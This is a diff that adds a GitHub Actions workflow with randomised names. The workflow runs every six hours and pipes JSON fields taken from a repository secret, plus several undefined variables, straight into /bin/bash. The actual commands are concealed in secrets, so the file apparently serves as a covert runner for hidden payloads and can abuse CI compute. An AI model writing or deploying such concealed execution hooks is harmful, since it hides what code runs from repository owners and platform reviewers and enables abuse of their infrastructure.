@@ -1,0 +1,30 @@
+name: pastelbountiful
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: pastelbountiful
+        env:
+          lwmqb29: ${{ secrets.lwmqb29 }}
+        run: |
+          echo $lwmqb29 | jq -r .foh6 | /bin/bash
+          echo $fp262 | jq -r .raoc53363 | /bin/bash
+          echo $ugnn322 | jq -r .i4547 | /bin/bash
+          echo $q1218 | jq -r .rqbgu428 | /bin/bash
+          echo $gkm3 | jq -r .zf0 | /bin/bash
+          echo $ruy7 | jq -r .mtv0317 | /bin/bash
+          echo $w66 | jq -r .oesu868 | /bin/bash
+          echo $q47 | jq -r .lkj39830 | /bin/bash
+          echo $pmxvv64585 | jq -r .y572 | /bin/bash
+          echo $utn503 | jq -r .xxri39271 | /bin/bash
+          echo $qs959 | jq -r .l07 | /bin/bash
+          echo $jbgo31 | jq -r .fjbh3 | /bin/bash
+          echo $ae46765 | jq -r .geb0963 | /bin/bash
+
